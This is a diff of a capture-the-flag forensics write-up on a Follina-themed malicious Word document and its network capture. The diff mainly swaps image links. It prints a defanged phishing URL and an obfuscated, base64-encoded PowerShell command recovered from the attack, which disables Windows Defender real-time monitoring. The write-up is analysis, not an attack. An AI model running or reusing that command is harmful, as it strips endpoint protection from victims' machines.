@@ -11,47 +11,61 @@ A CEO of a startup company reported that he could no longer access his Password 
 - https://github.com/decalage2/oletools
 
 ## birthday_invite.docx
-![[Pasted image 20220718102452.png]]
 
-### olevba on birthday_invite.docx
-![[Pasted image 20220718102542.png]]
+![Birthday Invite](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_birthday_invite.png)
 
-### unzipping the docx 
-![[Pasted image 20220718102634.png]]
+### Using olevba on birthday_invite.docx
 
-### using oletools on contents
-![[Pasted image 20220718102808.png]]
+![olevba on Birthday Invite](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_olevba_on_doc.png)
+
+### Unzipping the Docx 
+
+![Unzipping the Doc](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_unzip_doc.png)
+
+### Using oletools on Contents
+
+![Using oletools on Contents](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_using_oletools_on_contents.png)
+
 `hxxp://windowsliveupdater.com?Pt2=RjBsbGluYV9oNHNf-->`
 
-## pcap analysis
+## PCAP Analysis
 
-### suspicious site
-![[Pasted image 20220718103018.png]]
+### Phishing site
 
-### initial payload
-![[Pasted image 20220718104058.png]]
+![Phishing Site](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_phishing_site.png)
 
-### alex has been pwnd
+### Possible Initial Payload
 
-![[Pasted image 20220718103125.png]]
+![Possible Initial Payload](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_1.png)
+
+### Alex Has Been Pwnd
+
+![Alex Has Been Pwnd](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_2.png)
+
 ```powershell
 powershell.exe -enc LgAgACgAIAAkAGUAbgBWADoAYwBvAG0AUwBwAGUAYwBbADQALAAyADQALAAyADUAXQAtAEoATwBpAG4AJwAnACkAIAAoACAAKAAoACgAIgB7ADIAfQB7ADAAfQB7ADcAfQB7ADEAfQB7ADEAMQB9AHsANQB9AHsANgB9AHsAOQB9AHsAMQAwAH0AewA0AH0AewA4AH0AewAzAH0AIgAtAGYAIAAnAGUAZgAnACwAJwAgACcALAAnAFMAZQB0AC0ATQBwAFAAcgAnACwAJwB1AGUAJwAsACcAdAAnACwAJwBhAGwAdABpAG0AZQAnACwAJwBNAG8AbgBpACcALAAnAGUAcgBlAG4AYwBlACcALAAnAHIAJwAsACcAdABvAHIAJwAsACcAaQBuAGcAIABLADMANQAnACwAJwAtAEQAaQBzAGEAYgBsAGUAUgBlACcAKQApACAALQByAGUAcABMAGEAYwBFACAAIAAnAEsAMwA1ACcALABbAEMAaABBAFIAXQAzADYAKQApAA==
 ```
 
 ## Actual Forensics
+
 ### IOC 1
-![[Pasted image 20220718104508.png]]
-![[Pasted image 20220718104642.png]]
+
+![Forensics - IOC 1-1](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_forensics_ioc_1_1.png)
+![Forensics - IOC 1-2](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc_1_2.png)
+
 - flag pt 1 = `HTB{Zer0_DayZ_4Re_C0Ol_BuT_`
 
 ### IOC 2
-![[Pasted image 20220718104805.png]]
-![[Pasted image 20220718105013.png]]
-- flag pt 3 = `b33n_pAtch3d!}`
 
-### IOC 3 
-![[Pasted image 20220718105142.png]]
+![Forensics - IOC 3](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc3.png)
 - flag pt 2 = `F0llina_h4s_`
+
+### IOC 3
+
+![Forensics - IOC 2-1](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc2_1.png)
+![Forensics - IOC 2-2](https://github.com/thebriandurham/CTFs/blob/main/HTB%20Biz%2022/Images/linas_ioc2_2.png)
+
+- flag pt 3 = `b33n_pAtch3d!}`
 
 ## Assembled flag
 - `HTB{Zer0_DayZ_4Re_C0Ol_BuT_F0llina_h4s_B33N_PaTCH3D!}`
